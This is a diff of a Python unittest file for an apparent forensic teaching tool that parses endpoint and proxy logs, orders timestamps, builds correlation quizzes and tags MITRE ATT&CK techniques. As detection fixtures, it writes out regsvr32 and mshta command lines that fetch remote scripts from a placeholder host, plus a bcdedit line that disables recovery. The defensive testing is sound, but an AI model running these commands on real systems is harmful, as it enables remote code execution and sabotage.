@@ -17,13 +17,49 @@ import unittest
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
+import attck  # noqa: E402
 import evidence  # noqa: E402
 import explain  # noqa: E402
 import timeline  # noqa: E402
+from parsers import InputSource  # noqa: E402
+from parsers import itm2 as itm2_fmt  # noqa: E402
+from parsers import proxy as proxy_fmt  # noqa: E402
 
-ENDPOINT = "case2022/DFIR/logs.zip :: logs/ws99.log"
-SECOND = "case2022/DFIR/logs.zip :: logs/dc01.log"
-PROXY_NAME = "case2022/DFIR/logs.zip :: logs/proxy01.log"
+#: このファイルの入力は、どれも「その形式の記録だ」と分かっているログ。
+#: Proxy は内容だけでは形式を言い切れない（Web サーバーのログと同じ形）ので
+#: 自動判定に参加しない。本番でプロファイルが `parsers` に明示するのと同じく、
+#: ここでも明示して読む。
+KNOWN_FORMATS = ["itm2", "proxy"]
+
+
+def build_lesson(name, sources, lesson_id, parser_ids=None, **kwargs):
+    return explain.build_lesson(name, sources, lesson_id,
+                                parser_ids=KNOWN_FORMATS if parser_ids is None else parser_ids,
+                                **kwargs)
+
+
+ENDPOINT = "example-incident/evidence/logs.zip :: logs/ws99.log"
+SECOND = "example-incident/evidence/logs.zip :: logs/dc01.log"
+PROXY_NAME = "example-incident/evidence/logs.zip :: logs/proxy01.log"
+
+
+def parse_itm2(text: str, name: str = ""):
+    """ITM2 パーサーの正規化イベント。相関の候補や事象はここから作る。"""
+    return itm2_fmt.PARSER.parse(InputSource(name, text), None)
+
+
+def parse_proxy(text: str, name: str = ""):
+    return proxy_fmt.PARSER.parse(InputSource(name, text), None)
+
+
+def attck_from_excerpt(excerpt: str, ids: list):
+    """保存済みの抜粋から、ITM2 の読み方で ATT&CK を引き直す。"""
+    reader = itm2_fmt.PARSER
+    return attck.for_process(
+        reader.reread("process", "program_name", excerpt),
+        reader.reread("process", "command_line", excerpt),
+        ids,
+    )
 
 
 def itm2(ts, host, evt="ps", sub="start", **fields) -> str:
@@ -62,7 +98,7 @@ def rich_sources() -> dict:
 
 
 def build(sources=None) -> dict:
-    lesson = explain.build_lesson("t", sources or rich_sources(), "gen-rich")
+    lesson = build_lesson("t", sources or rich_sources(), "gen-rich")
     assert lesson is not None
     return lesson
 
@@ -70,43 +106,43 @@ def build(sources=None) -> dict:
 class TestStampParsing(unittest.TestCase):
     def test_itm2_timestamp_is_kept_verbatim(self):
         """No timezone rewriting: the screen must match the log."""
-        stamp = timeline.parse_itm2("10/05/2022 14:00:27.738 +0900 rest")
+        stamp = itm2_fmt.parse_timestamp("10/05/2022 14:00:27.738 +0900 rest")
         self.assertTrue(stamp.known)
         self.assertEqual(stamp.display, "10/05/2022 14:00:27.738 +0900")
         self.assertIn("14:00:27", stamp.display)
 
     def test_proxy_timestamp_is_kept_verbatim(self):
-        stamp = timeline.parse_proxy("05/Oct/2022:14:00:07 +0900")
+        stamp = proxy_fmt.parse_timestamp("05/Oct/2022:14:00:07 +0900")
         self.assertTrue(stamp.known)
         self.assertEqual(stamp.display, "05/Oct/2022:14:00:07 +0900")
 
     def test_unparseable_timestamp_is_kept_as_unknown(self):
         """Dropping the record would make it disappear from the investigation."""
         for bad in ("", "not a time", "13/45/2022 99:99:99", None):
-            stamp = timeline.parse_itm2(bad)
+            stamp = itm2_fmt.parse_timestamp(bad)
             self.assertFalse(stamp.known)
             self.assertEqual(stamp.display, timeline.UNKNOWN_LABEL)
 
     def test_unknown_sorts_last(self):
-        known = {"_stamp": timeline.parse_itm2("10/05/2022 14:00:01.000 +0900")}
+        known = {"_stamp": itm2_fmt.parse_timestamp("10/05/2022 14:00:01.000 +0900")}
         unknown = {"_stamp": timeline.UNKNOWN}
         self.assertLess(timeline.order_key(known), timeline.order_key(unknown))
 
     def test_fraction_is_honoured(self):
-        early = timeline.parse_itm2("10/05/2022 14:00:01.100 +0900")
-        late = timeline.parse_itm2("10/05/2022 14:00:01.900 +0900")
+        early = itm2_fmt.parse_timestamp("10/05/2022 14:00:01.100 +0900")
+        late = itm2_fmt.parse_timestamp("10/05/2022 14:00:01.900 +0900")
         self.assertLess(early.sort, late.sort)
 
     def test_timezone_offset_is_applied_for_comparison_only(self):
         """+0900 09:00 and +0000 00:00 are the same instant."""
-        jst = timeline.parse_itm2("10/05/2022 09:00:00.000 +0900")
-        utc = timeline.parse_itm2("10/05/2022 00:00:00.000 +0000")
+        jst = itm2_fmt.parse_timestamp("10/05/2022 09:00:00.000 +0900")
+        utc = itm2_fmt.parse_timestamp("10/05/2022 00:00:00.000 +0000")
         self.assertEqual(jst.sort, utc.sort)
         self.assertIn("+0900", jst.display)
 
     def test_missing_offset_is_marked_not_comparable(self):
-        naive = timeline.parse_itm2("10/05/2022 14:00:01.000")
-        aware = timeline.parse_itm2("10/05/2022 14:00:01.000 +0900")
+        naive = itm2_fmt.parse_timestamp("10/05/2022 14:00:01.000")
+        aware = itm2_fmt.parse_timestamp("10/05/2022 14:00:01.000 +0900")
         self.assertTrue(naive.known)
         self.assertFalse(naive.comparable)
         self.assertTrue(aware.comparable)
@@ -115,7 +151,7 @@ class TestStampParsing(unittest.TestCase):
 class TestOrdering(unittest.TestCase):
     def entry(self, ts, member, line, ident):
         return {
-            "_stamp": timeline.parse_itm2(ts),
+            "_stamp": itm2_fmt.parse_timestamp(ts),
             "member": member, "line": line, "evidenceId": ident,
         }
 
@@ -132,9 +168,9 @@ class TestOrdering(unittest.TestCase):
         self.assertEqual(forward[0]["member"], "a.log")
 
     def test_mixed_formats_sort_together(self):
-        itm = {"_stamp": timeline.parse_itm2("10/05/2022 14:00:09.000 +0900"),
+        itm = {"_stamp": itm2_fmt.parse_timestamp("10/05/2022 14:00:09.000 +0900"),
                "member": "a", "line": 1, "evidenceId": "1"}
-        prx = {"_stamp": timeline.parse_proxy("05/Oct/2022:14:00:07 +0900"),
+        prx = {"_stamp": proxy_fmt.parse_timestamp("05/Oct/2022:14:00:07 +0900"),
                "member": "b", "line": 1, "evidenceId": "2"}
         ordered = sorted([itm, prx], key=timeline.order_key)
         self.assertEqual(ordered[0]["evidenceId"], "2", "proxy が 2 秒早い")
@@ -157,9 +193,9 @@ class TestTimelineSection(unittest.TestCase):
         """
         self.assertTrue(all(r["timeKnown"] for r in self.rows), "fixture は全件時刻あり")
         seconds = [
-            timeline.parse_itm2(r["timestamp"]).sort
-            if timeline.parse_itm2(r["timestamp"]).known
-            else timeline.parse_proxy(r["timestamp"]).sort
+            itm2_fmt.parse_timestamp(r["timestamp"]).sort
+            if itm2_fmt.parse_timestamp(r["timestamp"]).known
+            else proxy_fmt.parse_timestamp(r["timestamp"]).sort
             for r in self.rows
         ]
         self.assertEqual(seconds, sorted(seconds), "時刻順に並んでいない")
@@ -229,7 +265,7 @@ class TestCorrelationQuestion(unittest.TestCase):
 
     def test_not_generated_when_times_cannot_be_read(self):
         store = evidence.EvidenceStore()
-        cands = explain._correlation_candidates(explain.parse_itm2(
+        cands = explain.correlation_candidates(parse_itm2(
             "\n".join([
                 itm2("時刻不明", "WS99", psPath="C:\\W\\cmd.exe"),
                 itm2("こちらも不明", "WS99", psPath="C:\\W\\powershell.exe"),
@@ -244,7 +280,7 @@ class TestCorrelationQuestion(unittest.TestCase):
     def test_not_generated_across_different_hosts(self):
         """Two hosts' clocks are not a basis for saying which came first."""
         store = evidence.EvidenceStore()
-        cands = explain._correlation_candidates(explain.parse_itm2(
+        cands = explain.correlation_candidates(parse_itm2(
             "\n".join([
                 itm2("10/05/2022 14:00:01.000 +0900", "WS99",
                      psPath="C:\\W\\cmd.exe"),
@@ -260,7 +296,7 @@ class TestCorrelationQuestion(unittest.TestCase):
     def test_not_generated_when_timestamps_are_identical(self):
         store = evidence.EvidenceStore()
         same = "10/05/2022 14:00:01.000 +0900"
-        cands = explain._correlation_candidates(explain.parse_itm2(
+        cands = explain.correlation_candidates(parse_itm2(
             "\n".join([
                 itm2(same, "WS99", psPath="C:\\W\\cmd.exe"),
                 itm2(same, "WS99", psPath="C:\\W\\powershell.exe"),
@@ -273,7 +309,7 @@ class TestCorrelationQuestion(unittest.TestCase):
     def test_failure_reason_is_recorded_for_the_learner(self):
         """Not silently absent: the lesson says why it is not there."""
         sources = {ENDPOINT: itm2("bad", "WS99", psPath="C:\\W\\cmd.exe")}
-        lesson = explain.build_lesson("t", sources, "gen-x")
+        lesson = build_lesson("t", sources, "gen-x")
         if lesson is None:
             self.skipTest("この入力では教材自体が作れない")
         topics = " ".join(u["detail"] for u in lesson["report"]["unknowns"])
@@ -298,7 +334,7 @@ class TestGroundedAttck(unittest.TestCase):
 
     def test_only_allowlisted_rules_are_used(self):
         allowed = {
-            rule[0] for needs, rule in explain._PROCESS_ATTCK.values() if not needs
+            rule[0] for needs, rule in attck.PROCESS_RULES.values() if not needs
         }
         # 引数で決まる規則は、規則表からは ID を読めない。代表的な引数列を
         # 通して、返ってくる ID を許可リストへ入れる。
@@ -308,19 +344,19 @@ class TestGroundedAttck(unittest.TestCase):
                     "schtasks.exe /create /tn a", "rundll32.exe a.dll,Start",
                     "regsvr32.exe /i:http://198.51.100.9/a scrobj.dll",
                     "mshta.exe http://198.51.100.9/a.hta"):
-            needs, rule = explain._PROCESS_ATTCK[cmd.split(" ", 1)[0]]
-            got = rule(explain._tokens(cmd))
+            needs, rule = attck.PROCESS_RULES[cmd.split(" ", 1)[0]]
+            got = rule(attck.tokens(cmd))
             self.assertIsNotNone(got, cmd)
             allowed.add(got[0])
-        allowed |= {r[1] for r in explain._REGISTRY_ATTCK}
+        allowed |= {r[1] for r in attck.REGISTRY_RULES}
         for t in self.techniques:
             self.assertIn(t["id"], allowed, t["id"])
 
     def test_outbound_traffic_alone_is_never_tagged(self):
         """POST, an external address, and an .exe are not techniques."""
         store = evidence.EvidenceStore()
-        events = explain.events_from_proxy(
-            explain.parse_proxy(
+        events = explain.display_events(
+            parse_proxy(
                 "\n".join([
                     proxy("05/Oct/2022:14:00:07 +0900", "192.0.2.10",
                           method="POST", target="http://203.0.113.9/upload.exe"),
@@ -344,15 +380,15 @@ class TestGroundedAttck(unittest.TestCase):
                  psPath="C:\\W\\SysWOW64\\rundll32.exe",
                  cmd="rundll32.exe other.dll,Run"),
         ])
-        lesson = explain.build_lesson("t", {ENDPOINT: text}, "gen-dup")
+        lesson = build_lesson("t", {ENDPOINT: text}, "gen-dup")
         rows = [t for t in lesson["report"]["techniques"] if t["id"] == "T1218.011"]
         self.assertEqual(len(rows), 1, "同じ手法は 1 件へまとめる")
         self.assertGreaterEqual(len(rows[0]["evidenceIds"]), 2, "根拠は失わない")
 
     def test_registry_rule_needs_the_exact_path(self):
         store = evidence.EvidenceStore()
-        events = explain.events_from_itm2(
-            explain.parse_itm2(
+        events = explain.display_events(
+            parse_itm2(
                 itm2("10/05/2022 14:00:01.000 +0900", "WS99", evt="reg",
                      sub="setVal", path="HKCU\\Software\\Example\\NotAutorun"),
                 name=ENDPOINT,
@@ -377,7 +413,7 @@ class TestReportStructure(unittest.TestCase):
     def test_introduction_says_so_when_hosts_are_unknown(self):
         """No invented values: say it could not be read."""
         text = proxy("05/Oct/2022:14:00:07 +0900", "192.0.2.10")
-        lesson = explain.build_lesson("t", {PROXY_NAME: text}, "gen-p")
+        lesson = build_lesson("t", {PROXY_NAME: text}, "gen-p")
         if lesson is None:
             self.skipTest("この入力では教材を作れない")
         hosts = lesson["introduction"]["hosts"]
@@ -428,7 +464,7 @@ class TestEmptyAndPartial(unittest.TestCase):
         # 1 件だけでは選択肢が作れないので、設問は生まれない。
         text = itm2("10/05/2022 14:00:01.000 +0900", "WS99",
                     evt="file", sub="create", path="C:\\Users\\a\\only.dat")
-        lesson = explain.build_lesson("t", {ENDPOINT: text}, "gen-thin")
+        lesson = build_lesson("t", {ENDPOINT: text}, "gen-thin")
         self.assertIsNotNone(lesson)
         stage = lesson["stages"][0]
         self.assertTrue(stage["events"], "観測できた事実は残す")
@@ -438,7 +474,7 @@ class TestEmptyAndPartial(unittest.TestCase):
     def test_no_technique_is_reported_as_such(self):
         text = itm2("10/05/2022 14:00:01.000 +0900", "WS99",
                     evt="file", sub="create", path="C:\\Users\\a\\only.dat")
-        lesson = explain.build_lesson("t", {ENDPOINT: text}, "gen-thin")
+        lesson = build_lesson("t", {ENDPOINT: text}, "gen-thin")
         self.assertEqual(lesson["report"]["techniques"], [])
         topics = [u["topic"] for u in lesson["report"]["unknowns"]]
         self.assertIn("ATT&CK の対応", topics)
@@ -448,7 +484,7 @@ class TestEmptyAndPartial(unittest.TestCase):
             itm2("壊れた時刻", "WS99", psPath="C:\\W\\cmd.exe"),
             itm2("これも壊れている", "WS99", psPath="C:\\W\\powershell.exe"),
         ])
-        lesson = explain.build_lesson("t", {ENDPOINT: text}, "gen-bad")
+        lesson = build_lesson("t", {ENDPOINT: text}, "gen-bad")
         if lesson is None:
             self.skipTest("この入力では教材を作れない")
         topics = [u["topic"] for u in lesson["report"]["unknowns"]]
@@ -456,7 +492,7 @@ class TestEmptyAndPartial(unittest.TestCase):
 
     def test_lesson_with_no_parseable_logs_returns_none(self):
         self.assertIsNone(
-            explain.build_lesson("t", {ENDPOINT: "まったく関係のない文章"}, "gen-0")
+            build_lesson("t", {ENDPOINT: "まったく関係のない文章"}, "gen-0")
         )
 
 
@@ -472,8 +508,8 @@ def _tag_for(cmd: str, exe: str = None, ts="10/05/2022 14:00:01.000 +0900"):
     """1 行だけ食わせて、付いた ATT&CK を返す。"""
     exe = exe or cmd.split(" ", 1)[0]
     store = evidence.EvidenceStore()
-    events = explain.events_from_itm2(
-        explain.parse_itm2(
+    events = explain.display_events(
+        parse_itm2(
             itm2(ts, "WS99", psPath=f"C:\\Windows\\System32\\{exe}", cmd=cmd),
             name=ENDPOINT,
         ),
@@ -588,8 +624,8 @@ class TestAttckNeedsTheArguments(unittest.TestCase):
                          ("whoami.exe", "T1033")):
             with self.subTest(exe=exe):
                 store = evidence.EvidenceStore()
-                events = explain.events_from_itm2(
-                    explain.parse_itm2(
+                events = explain.display_events(
+                    parse_itm2(
                         itm2("10/05/2022 14:00:01.000 +0900", "WS99",
                              psPath=f"C:\\Windows\\System32\\{exe}"),
                         name=ENDPOINT,
@@ -600,12 +636,12 @@ class TestAttckNeedsTheArguments(unittest.TestCase):
 
     def test_every_rule_declares_what_it_needs(self):
         """起動だけで足りる規則は組、引数で決まる規則は関数。"""
-        for exe, (needs_arg, rule) in explain._PROCESS_ATTCK.items():
+        for exe, (needs_arg, rule) in attck.PROCESS_RULES.items():
             with self.subTest(exe=exe):
                 self.assertIsInstance(needs_arg, bool)
                 if needs_arg:
                     self.assertTrue(callable(rule), f"{exe} の規則が関数でない")
-                    self.assertIsNone(rule(explain._tokens(exe)),
+                    self.assertIsNone(rule(attck.tokens(exe)),
                                       f"{exe} は引数なしでは判定できないはず")
                 else:
                     self.assertEqual(len(rule), 3, exe)
@@ -631,8 +667,8 @@ class TestAttckFromStoredExcerpt(unittest.TestCase):
         self.assertGreater(line.index("psPath="), evidence.MAX_EXCERPT,
                            "前提が崩れている: psPath が抜粋内に収まっている")
         store = evidence.EvidenceStore()
-        events = explain.events_from_itm2(
-            explain.parse_itm2(line, name=ENDPOINT), store
+        events = explain.display_events(
+            parse_itm2(line, name=ENDPOINT), store
         )
         self.assertTrue(events)
         excerpt = store.get(events[0]["evidenceIds"][0])["source"]["excerpt"]
@@ -650,15 +686,15 @@ class TestAttckFromStoredExcerpt(unittest.TestCase):
                     continue
                 excerpt = lesson["evidence"][event["evidenceIds"][0]]["source"]["excerpt"]
                 if event["type"] == "process":
-                    again = explain._attck_for_process(excerpt, event["evidenceIds"])
+                    again = attck_from_excerpt(excerpt, event["evidenceIds"])
                     self.assertIsNotNone(again, excerpt[:120])
                     self.assertEqual(again["id"], tag["id"])
                     self.assertEqual(again["reason"], tag["reason"])
                 else:
                     # レジストリ規則も、抜粋の path から引き直せること。
-                    kept = explain._field_in(excerpt, "path")
+                    kept = itm2_fmt.field_in(excerpt, "path")
                     self.assertTrue(
-                        any(n in kept for n, *_ in explain._REGISTRY_ATTCK),
+                        any(n in kept for n, *_ in attck.REGISTRY_RULES),
                         kept,
                     )
                 self.assertEqual(tag["confidence"], "high")
@@ -679,7 +715,7 @@ class TestTechniqueReasonsStayWithTheirEvidence(unittest.TestCase):
                  psPath="C:\\Windows\\System32\\bcdedit.exe",
                  cmd="bcdedit.exe /set {default} recoveryenabled no"),
         ])
-        self.lesson = explain.build_lesson("t", {ENDPOINT: text}, "gen-t1490")
+        self.lesson = build_lesson("t", {ENDPOINT: text}, "gen-t1490")
         rows = [t for t in self.lesson["report"]["techniques"] if t["id"] == "T1490"]
         self.assertEqual(len(rows), 1, "T1490 は 1 件にまとまる")
         self.row = rows[0]
@@ -726,14 +762,14 @@ class TestCorrelationRejectsMixedTimeBases(unittest.TestCase):
             itm2("10/05/2022 12:00:00.000 +0900", "WS99",
                  psPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
         ])
-        return store, explain._correlation_candidates(
-            explain.parse_itm2(text, name=ENDPOINT)
+        return store, explain.correlation_candidates(
+            parse_itm2(text, name=ENDPOINT)
         )
 
     def test_the_fixture_really_mixes_time_bases(self):
         """前提を固定する。全部が比較可能なら、この検査は意味を持たない。"""
         _, cands = self._events()
-        flags = {c.stamp.comparable for c in cands}
+        flags = {c.timestamp.comparable for c in cands}
         self.assertEqual(flags, {True, False}, "混在していない")
 
     def test_the_naive_record_in_the_middle_is_not_used(self):
@@ -764,10 +800,10 @@ class TestCorrelationRejectsMixedTimeBases(unittest.TestCase):
             itm2("10/05/2022 09:00:10.000", "WS99", evt="file", sub="create",
                  path="C:\\Users\\test\\near.dat"),
         ])
-        cands = explain._correlation_candidates(
-            explain.parse_itm2(text, name=ENDPOINT)
+        cands = explain.correlation_candidates(
+            parse_itm2(text, name=ENDPOINT)
         )
-        bases = {c.stamp.basis for c in cands}
+        bases = {c.timestamp.basis for c in cands}
         self.assertEqual(len(bases), 2, f"前提が崩れている: {bases}")
         quiz, why, _ = explain._correlation_quiz(store, cands, "q")
         self.assertIsNone(quiz)
@@ -787,8 +823,8 @@ class TestCorrelationRejectsMixedTimeBases(unittest.TestCase):
             itm2("10/05/2022 01:00:30.000", "WS99", evt="file", sub="create",
                  path="C:\\Users\\test\\made.dat"),
         ])
-        cands = explain._correlation_candidates(
-            explain.parse_itm2(text, name=ENDPOINT)
+        cands = explain.correlation_candidates(
+            parse_itm2(text, name=ENDPOINT)
         )
         quiz, why, pair = explain._correlation_quiz(store, cands, "q")
         self.assertIsNotNone(quiz, why)
@@ -895,7 +931,7 @@ class TestMixedTimeBasesAreDisclosed(unittest.TestCase):
             itm2("10/05/2022 01:00:00.000", "WS99", evt="file", sub="create",
                  path="C:\\Users\\test\\middle.dat"),
         ])
-        lesson = explain.build_lesson("t", {ENDPOINT: text}, "gen-mixed")
+        lesson = build_lesson("t", {ENDPOINT: text}, "gen-mixed")
         topics = " ".join(u["topic"] for u in lesson["report"]["unknowns"])
         self.assertIn("時刻の基準が揃っていない", topics)
         rows = lesson["report"]["timeline"]
@@ -925,8 +961,8 @@ class TestCorrelationFollowsTheSpecifiedRule(unittest.TestCase):
 
     def _quiz(self, text, name=None, **kw):
         store = evidence.EvidenceStore()
-        cands = explain._correlation_candidates(
-            explain.parse_itm2(text, name=name or ENDPOINT)
+        cands = explain.correlation_candidates(
+            parse_itm2(text, name=name or ENDPOINT)
         )
         self.store = store
         return explain._correlation_quiz(store, cands, "q", **kw)
@@ -1006,22 +1042,22 @@ class TestCorrelationFollowsTheSpecifiedRule(unittest.TestCase):
     def test_process_and_network_is_a_pair_across_log_types(self):
         """端末ログとプロキシは端末の呼び名が違う。IP で結び付ける。"""
         store = evidence.EvidenceStore()
-        itm2_recs = explain.parse_itm2(
+        itm2_recs = parse_itm2(
             itm2("10/05/2022 14:00:00.000 +0900", "WS99",
                  psPath="C:\\Windows\\System32\\cmd.exe", ip="192.0.2.10"),
             name=ENDPOINT,
         )
-        proxy_recs = explain.parse_proxy(
+        proxy_recs = parse_proxy(
             proxy("05/Oct/2022:14:00:20 +0900", "192.0.2.10",
                   target="http://198.51.100.23/a"),
             name=PROXY_NAME,
         )
         # 前提: 表示名は一致していない。IP で結ぶしかない。
         self.assertNotEqual(
-            explain.events_from_itm2(itm2_recs, store)[0]["host"],
-            explain.events_from_proxy(proxy_recs, store)[0]["host"],
+            explain.display_events(itm2_recs, store)[0]["host"],
+            explain.display_events(proxy_recs, store)[0]["host"],
         )
-        cands = explain._correlation_candidates(itm2_recs, proxy_recs)
+        cands = explain.correlation_candidates(itm2_recs + proxy_recs)
         self.assertEqual(len(cands), 2)
         quiz, why, _ = explain._correlation_quiz(store, cands, "q")
         self.assertIsNotNone(quiz, why)
@@ -1075,16 +1111,16 @@ class TestCorrelationFollowsTheSpecifiedRule(unittest.TestCase):
              itm2("10/05/2022 09:00:10.000", "WS99", evt="file", sub="create",
                   path="C:\\Users\\test\\a.dat", ip="192.0.2.10")),
         ):
-            cands += explain._correlation_candidates(
-                explain.parse_itm2(line, name=name)
+            cands += explain.correlation_candidates(
+                parse_itm2(line, name=name)
             )
         self.assertEqual(len(cands), 2)
         # 前提: どちらも「タイムゾーン無し」で、真偽値では区別が付かない。
-        self.assertEqual({c.stamp.comparable for c in cands}, {False})
-        self.assertEqual(len({c.stamp.basis for c in cands}), 2)
+        self.assertEqual({c.timestamp.comparable for c in cands}, {False})
+        self.assertEqual(len({c.timestamp.basis for c in cands}), 2)
         # 種別も時間差も条件を満たしている。落ちる理由は基準だけ。
         self.assertEqual({c.kind for c in cands}, {"process", "file"})
-        self.assertEqual(abs(cands[0].stamp.sort - cands[1].stamp.sort), 10.0)
+        self.assertEqual(abs(cands[0].timestamp.sort - cands[1].timestamp.sort), 10.0)
         quiz, why, _ = explain._correlation_quiz(store, cands, "q")
         self.assertIsNone(quiz, "別のログの時計どうしを結び付けている")
         self.assertIn("関連付けの設問は作りませんでした", why)
@@ -1145,13 +1181,13 @@ class TestTimeArithmeticIsReal(unittest.TestCase):
     """
 
     def test_one_minute_across_an_hour_boundary(self):
-        a = timeline.parse_itm2("10/05/2022 09:59:30.000 +0900 x")
-        b = timeline.parse_itm2("10/05/2022 10:00:30.000 +0900 x")
+        a = itm2_fmt.parse_timestamp("10/05/2022 09:59:30.000 +0900 x")
+        b = itm2_fmt.parse_timestamp("10/05/2022 10:00:30.000 +0900 x")
         self.assertEqual(b.sort - a.sort, 60.0)
 
     def test_one_minute_across_a_day_boundary(self):
-        a = timeline.parse_itm2("10/05/2022 23:59:30.000 +0900 x")
-        b = timeline.parse_itm2("10/06/2022 00:00:30.000 +0900 x")
+        a = itm2_fmt.parse_timestamp("10/05/2022 23:59:30.000 +0900 x")
+        b = itm2_fmt.parse_timestamp("10/06/2022 00:00:30.000 +0900 x")
         self.assertEqual(b.sort - a.sort, 60.0)
 
     def test_one_minute_across_a_month_boundary(self):
@@ -1161,18 +1197,18 @@ class TestTimeArithmeticIsReal(unittest.TestCase):
         10 月のように 31 日ある月をまたぐ分には偶然合ってしまうので、
         30 日の月の末日で見る。
         """
-        a = timeline.parse_itm2("09/30/2022 23:59:30.000 +0900 x")
-        b = timeline.parse_itm2("10/01/2022 00:00:30.000 +0900 x")
+        a = itm2_fmt.parse_timestamp("09/30/2022 23:59:30.000 +0900 x")
+        b = itm2_fmt.parse_timestamp("10/01/2022 00:00:30.000 +0900 x")
         self.assertEqual(b.sort - a.sort, 60.0)
 
     def test_a_year_boundary(self):
-        a = timeline.parse_itm2("12/31/2022 23:59:30.000 +0900 x")
-        b = timeline.parse_itm2("01/01/2023 00:00:30.000 +0900 x")
+        a = itm2_fmt.parse_timestamp("12/31/2022 23:59:30.000 +0900 x")
+        b = itm2_fmt.parse_timestamp("01/01/2023 00:00:30.000 +0900 x")
         self.assertEqual(b.sort - a.sort, 60.0)
 
     def test_a_february_boundary_in_a_leap_year(self):
-        a = timeline.parse_itm2("02/28/2024 23:59:30.000 +0900 x")
-        b = timeline.parse_itm2("02/29/2024 00:00:30.000 +0900 x")
+        a = itm2_fmt.parse_timestamp("02/28/2024 23:59:30.000 +0900 x")
+        b = itm2_fmt.parse_timestamp("02/29/2024 00:00:30.000 +0900 x")
         self.assertEqual(b.sort - a.sort, 60.0)
 
     def test_a_short_month_does_not_stretch_the_gap(self):
@@ -1188,24 +1224,24 @@ class TestTimeArithmeticIsReal(unittest.TestCase):
             itm2("10/01/2022 00:00:10.000 +0900", "WS99", evt="file",
                  sub="create", path="C:\\Users\\test\\a.dat"),
         ])
-        cands = explain._correlation_candidates(
-            explain.parse_itm2(text, name=ENDPOINT)
+        cands = explain.correlation_candidates(
+            parse_itm2(text, name=ENDPOINT)
         )
         quiz, why, _ = explain._correlation_quiz(store, cands, "q")
         self.assertIsNotNone(quiz, why)
         self.assertEqual(quiz["correlation"]["gapSeconds"], 20.0)
 
     def test_a_date_that_does_not_exist_is_unreadable(self):
-        self.assertFalse(timeline.parse_itm2("02/31/2022 09:00:00.000 +0900 x").known)
+        self.assertFalse(itm2_fmt.parse_timestamp("02/31/2022 09:00:00.000 +0900 x").known)
 
     def test_a_leap_second_is_still_readable(self):
-        stamp = timeline.parse_itm2("06/30/2022 23:59:60.000 +0000 x")
+        stamp = itm2_fmt.parse_timestamp("06/30/2022 23:59:60.000 +0000 x")
         self.assertTrue(stamp.known)
         self.assertIn("23:59:60", stamp.display)
 
     def test_the_same_instant_in_two_zones_is_equal(self):
-        jst = timeline.parse_itm2("10/05/2022 09:00:00.000 +0900 x")
-        utc = timeline.parse_itm2("10/05/2022 00:00:00.000 +0000 x")
+        jst = itm2_fmt.parse_timestamp("10/05/2022 09:00:00.000 +0900 x")
+        utc = itm2_fmt.parse_timestamp("10/05/2022 00:00:00.000 +0000 x")
         self.assertEqual(jst.sort, utc.sort)
 
 
@@ -1213,22 +1249,22 @@ class TestComparisonBasis(unittest.TestCase):
     """比較基準は真偽値ではなく札。同じ札どうしだけが比べられる。"""
 
     def test_a_timezone_makes_it_comparable_anywhere(self):
-        st = timeline.parse_itm2("10/05/2022 09:00:00.000 +0900 x", "logs/a.log")
+        st = itm2_fmt.parse_timestamp("10/05/2022 09:00:00.000 +0900 x", "logs/a.log")
         self.assertEqual(st.basis, "utc")
         self.assertTrue(st.comparable)
 
     def test_without_a_timezone_the_basis_is_the_log_itself(self):
-        st = timeline.parse_itm2("10/05/2022 09:00:00.000 x", "logs/a.log")
+        st = itm2_fmt.parse_timestamp("10/05/2022 09:00:00.000 x", "logs/a.log")
         self.assertEqual(st.basis, "local:logs/a.log")
         self.assertFalse(st.comparable)
 
     def test_two_naive_lines_from_different_logs_do_not_share_a_basis(self):
-        a = timeline.parse_itm2("10/05/2022 09:00:00.000 x", "logs/a.log")
-        b = timeline.parse_itm2("10/05/2022 09:00:10.000 x", "logs/b.log")
+        a = itm2_fmt.parse_timestamp("10/05/2022 09:00:00.000 x", "logs/a.log")
+        b = itm2_fmt.parse_timestamp("10/05/2022 09:00:10.000 x", "logs/b.log")
         self.assertNotEqual(a.basis, b.basis)
 
     def test_an_unreadable_time_has_no_basis(self):
-        self.assertEqual(timeline.parse_itm2("なんだこれ", "logs/a.log").basis, "")
+        self.assertEqual(itm2_fmt.parse_timestamp("なんだこれ", "logs/a.log").basis, "")
         self.assertEqual(timeline.UNKNOWN.basis, "")
 
     def test_the_basis_reaches_the_lesson_json(self):
@@ -1262,19 +1298,18 @@ class TestHostIdentityIsRequired(unittest.TestCase):
             f'10/05/2022 09:00:10.000 +0900 {self.HEAD}{extra} '
             f'evt=file subEvt=create path="C:\\Users\\test\\a.dat"',
         ])
-        records = explain.parse_itm2(text, name=ENDPOINT)
-        # 事象は `_keys` を見るため、候補は相関へ渡すため。
-        return (store,
-                explain.events_from_itm2(records, store),
-                explain._correlation_candidates(records))
+        records = parse_itm2(text, name=ENDPOINT)
+        # 照合キーは正規化イベントが持つ。候補は相関へ渡すため。
+        return store, records, explain.correlation_candidates(records)
 
     def test_records_without_a_host_get_no_matching_key(self):
-        _, events, _ = self._events()
+        store, events, _ = self._events()
         self.assertEqual(len(events), 2)
-        self.assertEqual([e["host"] for e in events], ["?", "?"],
+        self.assertEqual(len(explain.display_events(events, store)), 2)
+        self.assertEqual([e.host for e in events], ["?", "?"],
                          "前提が崩れている: 表示用の host が ? でない")
         for e in events:
-            self.assertEqual(e["_keys"], set(), e["detail"])
+            self.assertEqual(e.correlation_keys, frozenset(), e.summary)
 
     def test_no_correlation_between_records_with_no_host(self):
         store, _, cands = self._events()
@@ -1287,7 +1322,8 @@ class TestHostIdentityIsRequired(unittest.TestCase):
             with self.subTest(com=com):
                 _, events, _ = self._events(com=com)
                 for e in events:
-                    self.assertEqual(e["_keys"], set(), f"{com!r} が採用された")
+                    self.assertEqual(e.correlation_keys, frozenset(),
+                                     f"{com!r} が採用された")
 
     def test_loopback_and_unspecified_addresses_are_not_matching_keys(self):
         """どの端末にもある住所なので、一致しても同じ端末とは言えない。"""
@@ -1295,7 +1331,8 @@ class TestHostIdentityIsRequired(unittest.TestCase):
             with self.subTest(addr=addr):
                 store, events, cands = self._events(ip=addr)
                 for e in events:
-                    self.assertEqual(e["_keys"], set(), f"{addr} が採用された")
+                    self.assertEqual(e.correlation_keys, frozenset(),
+                                     f"{addr} が採用された")
                 self.assertEqual(cands, [], f"{addr} が候補に残っている")
                 quiz, _, _ = explain._correlation_quiz(store, cands, "q")
                 self.assertIsNone(quiz, f"{addr} どうしを結んでいる")
@@ -1303,7 +1340,8 @@ class TestHostIdentityIsRequired(unittest.TestCase):
     def test_a_real_host_name_still_works(self):
         """締め付けただけで、使えるものまで使えなくなっていないこと。"""
